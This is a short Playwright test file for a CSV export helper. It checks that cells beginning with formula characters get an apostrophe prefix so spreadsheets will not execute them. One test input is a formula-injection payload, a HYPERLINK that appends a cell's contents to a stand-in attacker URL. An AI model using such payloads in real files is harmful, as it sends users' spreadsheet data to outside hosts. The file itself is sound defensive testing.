import { test, expect } from "@playwright/test";
import { csvCell } from "../src/react-app/lib/exportUtils";

// A CSV cell beginning with = + - @ (or a tab / CR) is executed as a formula
// when the file is opened in a spreadsheet — quoting alone does not stop it.
// csvCell is pure; the download path is the same function over every row.
test("csv export neutralises formula-leading cells and leaves the rest alone", () => {
  expect(csvCell('=HYPERLINK("https://evil.example/"&A1,"Click")')).toBe(
    `"'=HYPERLINK(""https://evil.example/""&A1,""Click"")"`,
  );
  expect(csvCell("+1 (555) 010-0100")).toBe(`"'+1 (555) 010-0100"`);
  expect(csvCell("-30 minutes over")).toBe(`"'-30 minutes over"`);
  expect(csvCell("@channel standup")).toBe(`"'@channel standup"`);
  expect(csvCell("\tindented")).toBe(`"'\tindented"`);

  expect(csvCell("Design sync")).toBe(`"Design sync"`);
  expect(csvCell('Quote "me"')).toBe(`"Quote ""me"""`);
  expect(csvCell("")).toBe(`""`);
  expect(csvCell(12.5)).toBe("12.5"); // numbers are never prefixed
});
